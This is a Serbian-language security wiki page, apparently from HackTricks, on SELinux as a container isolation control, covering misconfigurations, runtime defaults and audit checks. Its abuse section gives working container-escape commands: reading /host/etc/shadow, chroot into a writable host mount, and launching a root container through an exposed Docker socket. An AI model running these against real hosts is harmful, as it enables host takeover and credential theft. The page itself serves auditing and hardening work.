# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

SELinux je **obavezni sistem kontrole pristupa zasnovan na oznakama**. Svaki relevantan proces i objekat može nositi bezbednosni kontekst, a politika odlučuje koje domene mogu da interaguju sa kojim tipovima i na koji način. U kontejnerizovanim okruženjima, ovo obično znači da runtime pokreće proces kontejnera pod ograničenim kontejner domenom i označava sadržaj kontejnera odgovarajućim tipovima. Ako politika radi ispravno, proces može čitati i pisati stvari koje se očekuje da njegova oznaka treba da dodiruje, dok mu je onemogućen pristup ostalom sadržaju hosta, čak i ako taj sadržaj postane vidljiv kroz mount.

Ovo je jedna od najmoćnijih zaštita na strani hosta dostupnih u uobičajenim Linux kontejnerskim rasporedima. Posebno je važna na Fedora, RHEL, CentOS Stream, OpenShift i drugim SELinux-centriranim ekosistemima. U tim okruženjima, revizor koji ignoriše SELinux često će pogrešno razumeti zašto očigledan put do kompromitacije hosta zapravo biva blokiran.

## AppArmor Vs SELinux

Najlakša razlika na visokom nivou je da je AppArmor zasnovan na putanjama dok je SELinux **zasnovan na oznakama**. To ima velike posledice po sigurnost kontejnera. Politika zasnovana na putanjama može se ponašati drugačije ako isti sadržaj hosta postane vidljiv pod neočekivanom mount putanjom. Politika zasnovana na oznakama umesto toga pita koja je oznaka objekta i šta domen procesa može da uradi sa njom. To ne čini SELinux jednostavnim, ali ga čini otpornim na klasu pretpostavki zasnovanih na trikovima sa putanjama koje branitelji ponekad slučajno prave u sistemima zasnovanim na AppArmor-u.

Pošto je model orijentisan na oznake, rukovanje volume-ima kontejnera i odluke o ponovnom označavanju (relabeling) su bezbednosno kritične. Ako runtime ili operator promeni oznake preširoko da bi "napravio mountove da rade", granica politike koja je trebalo da sadrži workload može postati mnogo slabija nego što je zamišljeno.

## Lab

Da biste proverili da li je SELinux aktivan na hostu:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Da biste pregledali postojeće oznake na hostu:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Da biste uporedili normalno izvršavanje sa onim gde je označavanje onemogućeno:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Na hostu na kome je SELinux omogućen, ovo je veoma praktična demonstracija jer pokazuje razliku između workload-a koji radi pod očekivanim container domain-om i onog kojem je uklonjen taj sloj sprovođenja politike.

## Korišćenje u runtime-u

Podman je posebno usklađen sa SELinux-om na sistemima gde je SELinux deo podrazumevane platforme. Rootless Podman zajedno sa SELinux-om predstavlja jednu od najsnažnijih standardnih container polaznih tačaka zato što je proces već neprivilegovan na strani hosta i i dalje je ograničen MAC politikom. Docker takođe može koristiti SELinux tamo gde je podržan, iako administratori ponekad isključuju SELinux da bi zaobišli probleme sa označavanjem volumena. CRI-O i OpenShift se u velikoj meri oslanjaju na SELinux kao deo svoje priče o izolaciji containera. Kubernetes takođe može izložiti podešavanja vezana za SELinux, ali njihova vrednost očigledno zavisi od toga da li node OS zaista podržava i sprovodi SELinux.

Ponavljajuća lekcija je da SELinux nije opcionalni ukras. U ekosistemima izgrađenim oko njega, on je deo očekivanih sigurnosnih granica.

## Pogrešne konfiguracije

Klasična greška je `label=disable`. Operativno, ovo se često događa zato što je mount volumena bio odbijen pa je najbrže kratkoročno rešenje bilo ukloniti SELinux iz jednačine umesto ispravljanja modela označavanja. Druga česta greška je nepravilno relabelovanje sadržaja hosta. Opsežne relabel operacije mogu omogućiti da aplikacija radi, ali isto tako mogu proširiti šta container sme da dira daleko dalje nego što je prvobitno zamišljeno.

Takođe je važno ne brkati **instalirani** SELinux sa **efektivnim** SELinux-om. Host može podržavati SELinux, a ipak biti u permissive modu, ili runtime možda ne pokreće workload pod očekivanim domenom. U tim slučajevima zaštita je mnogo slabija nego što dokumentacija može sugerisati.

## Zloupotreba

Kada je SELinux odsutan, u permissive režimu ili široko onemogućen za workload, host-mounted putanje postaju mnogo lakše za zloupotrebu. Isti bind mount koji bi inače bio ograničen label-ima može postati direktan put do host podataka ili izmene hosta. Ovo je posebno relevantno u kombinaciji sa writable volume mount-ovima, direktorijumima container runtime-a ili operativnim skraćenicama koje su izložile osetljive host putanje radi pogodnosti.

SELinux često objašnjava zašto generic breakout writeup odmah radi na jednom hostu, ali na drugom stalno ne uspeva iako runtime flagovi deluju slično. Nedostajući sastojak često nije namespace ili capability, već granica label-a koja je ostala netaknuta.

Najbrža praktična provera je uporediti aktivni kontekst i zatim ispitati mountovane host putanje ili runtime direktorijume koji bi normalno bili ograničeni label-ima:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Ako je prisutan host bind mount i SELinux labeling je onemogućen ili oslabljen, često prvo dolazi do information disclosure:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Ako je mount upisiv i container je iz ugla kernela efektivno host-root, sledeći korak je testirati kontrolisanu modifikaciju hosta umesto nagađanja:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Na hostovima koji podržavaju SELinux, gubitak labela oko direktorijuma za runtime stanje može takođe izložiti direktne privilege-escalation puteve:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Ove komande ne zamenjuju kompletan escape chain, ali veoma brzo pokazuju da li je SELinux sprečavao pristup podacima hosta ili izmene fajlova na strani hosta.

### Potpuni primer: SELinux Disabled + Writable Host Mount

Ako je SELinux labeling onemogućen i host filesystem montiran kao writable na `/host`, kompletan host escape postaje običan slučaj zloupotrebe bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ako `chroot` uspe, container process sada radi iz host filesystem:
```bash
id
hostname
cat /etc/passwd | tail
```
### Kompletan primer: SELinux onemogućen + runtime direktorijum

Ako workload može da dosegne runtime socket nakon što su labels onemogućene, escape se može delegirati na runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Relevantno zapažanje je da SELinux često predstavlja kontrolu koja sprečava upravo ovu vrstu host-path ili runtime-state pristupa.

## Provere

Cilj SELinux provera je da potvrdi da je SELinux omogućen, identifikuje trenutni security context i utvrdi da li su fajlovi ili putanje koje su vam važne zapravo label-confined.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Šta je ovde zanimljivo:

- `getenforce` bi idealno trebalo da vrati `Enforcing`; `Permissive` ili `Disabled` menjaju smisao cele SELinux sekcije.
- Ako trenutni kontekst procesa izgleda neočekivano ili previše široko, workload možda ne radi pod predviđenom container politikom.
- Ako host-mounted fajlovi ili runtime direktorijumi imaju etikete kojima proces može pristupiti previše slobodno, bind mounts postaju mnogo opasniji.

Kada pregledate container na platformi koja podržava SELinux, nemojte tretirati labelovanje kao sekundarni detalj. U mnogim slučajevima to je jedan od glavnih razloga zašto host već nije kompromitovan.

## Runtime Defaults

| Runtime / platform | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Zavisno od hosta | SELinux separation je dostupna na hostovima sa omogućenim SELinux-om, ali tačno ponašanje zavisi od konfiguracije hosta/daemona | `--security-opt label=disable`, široko relabelovanje bind mounts, `--privileged` |
| Podman | Obično omogućen na SELinux hostovima | SELinux separation je normalan deo Podman-a na SELinux sistemima osim ako nije onemogućen | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Obično se ne dodeljuje automatski na nivou Poda | Postoji podrška za SELinux, ali Pod-ovi obično zahtevaju `securityContext.seLinuxOptions` ili platformom definisane podrazumevane vrednosti; potrebna je podrška na runtime-u i node-u | slabe ili preširoke `seLinuxOptions`, pokretanje na permissive/disabled nodes, platformske politike koje onemogućavaju labelovanje |
| CRI-O / OpenShift style deployments | Obično se u velikoj meri oslanjaju na njega | SELinux je često ključni deo modela izolacije čvorova u ovim okruženjima | prilagođene politike koje preširoko proširuju pristup, onemogućavanje labelovanja radi kompatibilnosti |

SELinux podrazumevana podešavanja zavise više od distribucije nego seccomp podrazumevanja. Na Fedora/RHEL/OpenShift-style sistemima, SELinux je često centralan za model izolacije. Na sistemima bez SELinux-a, on jednostavno nije prisutan.
{{#include ../../../../banners/hacktricks-training.md}}
